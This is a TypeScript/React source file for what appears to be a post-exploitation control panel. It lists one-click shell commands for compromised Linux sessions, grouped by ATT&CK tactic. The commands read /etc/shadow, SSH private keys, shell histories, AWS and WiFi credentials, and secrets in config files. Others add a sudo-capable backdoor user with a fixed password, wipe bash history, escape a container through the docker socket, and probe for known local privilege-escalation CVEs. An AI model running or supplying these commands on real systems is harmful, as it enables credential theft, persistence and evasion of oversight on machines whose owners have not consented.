import OSPanel from './OSPanel'
import type { OSConfig, Category } from './OSPanel'
import type { Session } from '../types'

const MODULES: Category[] = [
  {
    id: 'recon', icon: '🔍', label: 'RECON', atkId: 'TA0007',
    cmds: [
      { icon: '👤', label: 'id / groups',           cmd: 'id && groups',                                      tag: 'T1033' },
      { icon: '💻', label: 'OS / Kernel',            cmd: 'uname -a && cat /etc/os-release 2>/dev/null || cat /etc/issue', tag: 'T1082' },
      { icon: '⏱️', label: 'Uptime / Logins',       cmd: 'uptime && who && last | head -15',                  tag: 'T1033' },
      { icon: '👥', label: 'Local Users',            cmd: 'cat /etc/passwd | grep -v "nologin\\|false" | cut -d: -f1,3,4,6,7', tag: 'T1087' },
      { icon: '🔑', label: 'sudo -l',                cmd: 'sudo -l 2>&1',                                     tag: 'T1069' },
      { icon: '📋', label: 'Process Tree',           cmd: 'ps auxf | head -50',                               tag: 'T1057' },
      { icon: '⚙️', label: 'Running Services',       cmd: 'systemctl list-units --type=service --state=running 2>/dev/null | head -30', tag: 'T1007' },
      { icon: '📦', label: 'Installed Packages',     cmd: 'dpkg -l 2>/dev/null | head -30 || rpm -qa 2>/dev/null | head -30', tag: 'T1518' },
      { icon: '🛡️', label: 'SELinux / AppArmor',    cmd: 'cat /sys/kernel/security/lsm 2>/dev/null; sestatus 2>/dev/null; apparmor_status 2>/dev/null | head -10', tag: 'T1518' },
      { icon: '📝', label: 'SUID Binaries',          cmd: 'find / -perm -4000 -o -perm -2000 2>/dev/null | grep -v proc | head -30', tag: 'T1548' },
    ],
  },
  {
    id: 'privesc', icon: '⬆️', label: 'PRIV ESC', atkId: 'TA0004',
    cmds: [
      { icon: '🎭', label: 'sudo -l (full)',         cmd: 'sudo -l 2>&1',                                     tag: 'T1548' },
      { icon: '🔑', label: 'All SUID Binaries',      cmd: 'find / -perm -u=s -type f 2>/dev/null | xargs ls -la 2>/dev/null', tag: 'T1548' },
      { icon: '🔐', label: 'Capabilities (getcap)',  cmd: 'getcap -r / 2>/dev/null',                          tag: 'T1548' },
      { icon: '🧩', label: 'Writable /etc',          cmd: 'find /etc -writable -type f 2>/dev/null',          tag: 'T1574' },
      { icon: '📝', label: 'Cron Jobs (all)',        cmd: 'cat /etc/crontab; ls -la /etc/cron.*/ 2>/dev/null; crontab -l 2>/dev/null', tag: 'T1053' },
      { icon: '🌍', label: 'PATH Hijack',            cmd: 'echo $PATH; for p in $(echo $PATH | tr : " "); do ls -la "$p" 2>/dev/null | grep -E "rwxrwx"; done', tag: 'T1574' },
      { icon: '🐳', label: 'Docker Escape',          cmd: 'id | grep docker; cat /proc/1/cgroup 2>/dev/null; ls /.dockerenv 2>/dev/null && echo IN_CONTAINER; [ -w /var/run/docker.sock ] && echo DOCKER_SOCK_WRITABLE', tag: 'T1611' },
      { icon: '⚡', label: 'LD_PRELOAD',             cmd: 'cat /etc/ld.so.preload 2>/dev/null; ls -la /etc/ld.so.conf.d/; env | grep LD_', tag: 'T1574' },
      { icon: '📁', label: 'Readable /root',         cmd: 'ls -la /root 2>/dev/null; find /root -readable 2>/dev/null | head -10', tag: 'T1083' },
    ],
  },
  {
    id: 'creds', icon: '🔑', label: 'CREDENTIALS', atkId: 'TA0006',
    cmds: [
      { icon: '🔒', label: 'Shadow File',            cmd: 'cat /etc/shadow 2>/dev/null || echo needs-root',   tag: 'T1003' },
      { icon: '🔑', label: 'SSH Private Keys',       cmd: 'find /home /root -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null | head -10', tag: 'T1552' },
      { icon: '📋', label: 'Shell Histories',        cmd: 'cat /home/*/.bash_history /root/.bash_history /home/*/.zsh_history 2>/dev/null | head -60', tag: 'T1552' },
      { icon: '⚙️', label: 'Config w/ Passwords',   cmd: 'find /home /etc /var /opt -name "*.conf" -o -name ".env" -o -name "config.php" 2>/dev/null | xargs grep -l "password\\|passwd\\|secret\\|token" 2>/dev/null | head -15', tag: 'T1552' },
      { icon: '🗄️', label: 'DB Passwords in Code',  cmd: 'grep -r "password\\|passwd\\|db_pass" /var/www /opt /srv 2>/dev/null | grep -v ".git\\|Binary" | head -15', tag: 'T1552' },
      { icon: '🌐', label: 'WiFi Creds (NM)',        cmd: 'grep -r "psk\\|password" /etc/NetworkManager/system-connections/ 2>/dev/null', tag: 'T1552' },
    ],
  },
  {
    id: 'network', icon: '🌐', label: 'NETWORK', atkId: 'TA0007',
    cmds: [
      { icon: '🌐', label: 'IP Addresses',           cmd: 'ip addr show 2>/dev/null || ifconfig -a',          tag: 'T1016' },
      { icon: '🗺️', label: 'ARP Table',             cmd: 'arp -an 2>/dev/null || ip neigh show',             tag: 'T1016' },
      { icon: '🔌', label: 'Listening Ports',        cmd: 'ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null', tag: 'T1049' },
      { icon: '🛤️', label: 'Routing Table',         cmd: 'ip route show 2>/dev/null || route -n',            tag: 'T1016' },
      { icon: '🌍', label: 'DNS / Resolv',           cmd: 'cat /etc/resolv.conf; cat /etc/hosts',             tag: 'T1016' },
      { icon: '🔥', label: 'iptables Rules',         cmd: 'iptables -L -n -v 2>/dev/null; nft list ruleset 2>/dev/null', tag: 'T1562' },
      { icon: '🔍', label: 'Active Connections',     cmd: 'ss -antp 2>/dev/null | head -40',                  tag: 'T1049' },
    ],
  },
  {
    id: 'persist', icon: '🔒', label: 'PERSISTENCE', atkId: 'TA0003',
    cmds: [
      { icon: '🔧', label: 'Systemd Services',       cmd: 'ls -la /etc/systemd/system/ | head -20; systemctl list-units --type=service --all | grep loaded | head -20', tag: 'T1543' },
      { icon: '📝', label: 'Cron (all users)',       cmd: 'crontab -l 2>/dev/null; cat /etc/crontab; ls /etc/cron.d/ && cat /etc/cron.d/* 2>/dev/null', tag: 'T1053' },
      { icon: '🏃', label: 'Shell Profiles',         cmd: 'cat /etc/bash.bashrc /etc/profile /root/.bashrc 2>/dev/null | head -40', tag: 'T1546' },
      { icon: '👤', label: 'Add Backdoor User',      cmd: 'useradd -m -s /bin/bash -G sudo backd00r 2>/dev/null && echo "backd00r:P@ssw0rd123" | chpasswd 2>/dev/null && echo done || echo needs-root', tag: 'T1136' },
      { icon: '🗑️', label: 'Clear Bash History',    cmd: 'cat /dev/null > ~/.bash_history && history -c && echo cleared', tag: 'T1070' },
    ],
  },
  {
    id: 'lpe', icon: '💀', label: 'LPE / EXPLOITS', atkId: 'TA0004',
    cmds: [
      { icon: '💉', label: 'pkexec CVE-2021-4034',   cmd: '[ -f /usr/bin/pkexec ] && ls -la /usr/bin/pkexec && pkexec --version 2>&1 || echo not-found', tag: 'T1068' },
      { icon: '💀', label: 'Dirty Pipe CVE-2022-0847', cmd: 'uname -r | awk -F. \'{if ($1>=5 && $2>=8) print "POTENTIALLY_VULNERABLE: " $0; else print "likely-not: " $0}\'', tag: 'T1068' },
      { icon: '📦', label: 'sudo CVE-2021-3156',     cmd: 'sudoedit -s / 2>&1 | grep -q "usage" && echo VULNERABLE || echo patched', tag: 'T1068' },
      { icon: '🔑', label: 'GTFOBins Check',         cmd: 'for b in vim nano python python3 perl ruby lua awk find nmap tee cp mv wget curl bash; do which "$b" 2>/dev/null && echo "$b found"; done', tag: 'T1548' },
      { icon: '🧩', label: 'Writable /etc/passwd',   cmd: 'ls -la /etc/passwd; [ -w /etc/passwd ] && echo WRITABLE_PASSWD || echo not-writable', tag: 'T1003' },
    ],
  },
  {
    id: 'lateral', icon: '↔️', label: 'LATERAL MOVE', atkId: 'TA0008',
    cmds: [
      { icon: '🔑', label: 'SSH Keys (all users)',   cmd: 'find /home /root -name "id_rsa" -o -name "id_ed25519" 2>/dev/null | xargs ls -la 2>/dev/null; find /home /root -name "known_hosts" 2>/dev/null -exec cat {} \\;', tag: 'T1021' },
      { icon: '📡', label: 'SSH Known Hosts',        cmd: 'cat /home/*/.ssh/known_hosts /root/.ssh/known_hosts 2>/dev/null',              tag: 'T1021' },
      { icon: '🌐', label: 'SSH Agent Sockets',      cmd: 'find /tmp -name "ssh-*" -type s 2>/dev/null; echo "SSH_AUTH_SOCK=$SSH_AUTH_SOCK"', tag: 'T1021' },
      { icon: '📁', label: 'NFS / SMB Mounts',       cmd: 'mount | grep -E "nfs|cifs|smb"; cat /etc/fstab | grep -E "nfs|cifs|smb"',       tag: 'T1021' },
      { icon: '🔍', label: 'Scan Local /24',         cmd: 'ip route | grep -v default | head -1 | awk "{print $1}" | xargs -I{} sh -c "for i in $(seq 1 254); do (ping -c1 -W1 $(echo {} | cut -d/ -f1 | cut -d. -f1-3).$i 2>/dev/null | grep -q ttl && echo $(echo {} | cut -d/ -f1 | cut -d. -f1-3).$i) & done; wait"', tag: 'T1046' },
      { icon: '🔗', label: 'Check SSH Reuse',        cmd: 'ps aux | grep ssh | grep -v grep; ls /tmp/ssh-* 2>/dev/null',                   tag: 'T1021' },
      { icon: '🐳', label: 'Container Escape',       cmd: 'cat /proc/1/cgroup | grep docker; [ -w /var/run/docker.sock ] && docker run -v /:/mnt --rm -it alpine sh -c "cat /mnt/etc/shadow" 2>/dev/null || echo no-docker-sock', tag: 'T1611' },
    ],
  },
  {
    id: 'hunt', icon: '🎯', label: 'HUNT', atkId: 'TA0009',
    cmds: [
      { icon: '🔑', label: 'Hunt SSH Private Keys',  cmd: 'find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" -o -name "*.ppk" 2>/dev/null | grep -v proc | head -20', tag: 'T1552' },
      { icon: '💾', label: 'Hunt DB Files',          cmd: 'find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" -o -name "*.mdf" 2>/dev/null | grep -v "proc\\|sys\\|snap" | head -20', tag: 'T1005' },
      { icon: '📄', label: 'Hunt Passwords in Files', cmd: 'grep -rli "password\\|passwd\\|secret\\|api_key\\|token" /home /etc /var/www /opt 2>/dev/null | head -25', tag: 'T1552' },
      { icon: '🌐', label: 'Hunt VPN / Cloud',       cmd: 'find /home /root -name "*.ovpn" -o -name "credentials" -o -name "*.kube" 2>/dev/null | head -15; cat /home/*/.aws/credentials /root/.aws/credentials 2>/dev/null', tag: 'T1552' },
      { icon: '🔐', label: 'Hunt KeePass Files',     cmd: 'find / -name "*.kdbx" -o -name "*.kdb" 2>/dev/null | grep -v proc | head -10', tag: 'T1552' },
      { icon: '📧', label: 'Hunt Email / Tokens',    cmd: 'grep -r "gmail\\|smtp\\|imap\\|oauth\\|bearer" /home /opt /srv 2>/dev/null | grep -v ".git\\|Binary" | head -15', tag: 'T1552' },
      { icon: '🐳', label: 'Hunt Docker Secrets',    cmd: 'find / -name "docker-compose*.yml" -o -name ".env" 2>/dev/null | xargs grep -l "password\\|secret\\|token" 2>/dev/null | head -10', tag: 'T1552' },
    ],
  },
]

function joinUnix(base: string, name: string) { return base.replace(/\/+$/, '') + '/' + name }
function parentUnix(p: string) {
  if (p === '/') return '/'
  const t = p.replace(/\/+$/, '')
  const i = t.lastIndexOf('/')
  return i <= 0 ? '/' : t.slice(0, i)
}

const CONFIG: OSConfig = {
  name:       'Linux',
  icon:       '🐧',
  prompt:     '$',
  filter:     (s: Session) => {
    const os = (s.os ?? '').toLowerCase()
    return ['linux','ubuntu','debian','kali','fedora','centos','rhel','arch','alpine'].some(k => os.includes(k))
  },
  modules:    MODULES,
  defaultFs:  '/',
  joinPath:   joinUnix,
  parentPath: parentUnix,
  quickCmds: [
    { icon: '👤', label: 'id / groups',    cmd: 'id && groups' },
    { icon: '💻', label: 'uname / OS',     cmd: 'uname -a && cat /etc/os-release 2>/dev/null || cat /etc/issue' },
    { icon: '📋', label: 'Processes',      cmd: 'ps auxf | head -40' },
    { icon: '🌐', label: 'IP / Routes',    cmd: 'ip addr show && ip route show' },
    { icon: '🔑', label: 'sudo -l',        cmd: 'sudo -l 2>&1' },
    { icon: '📝', label: 'SUID Bins',      cmd: 'find / -perm -4000 2>/dev/null | grep -v proc | head -20' },
    { icon: '🔒', label: 'Shadow File',    cmd: 'cat /etc/shadow 2>/dev/null || echo needs-root' },
    { icon: '🏠', label: 'Home Dir',       cmd: 'ls -la ~ && ls -la /home/' },
  ],
}

interface Props { onOpenTerminal: (id: string, name?: string) => void }
export default function Linux({ onOpenTerminal }: Props) {
  return <OSPanel config={CONFIG} onOpenTerminal={onOpenTerminal} />
}
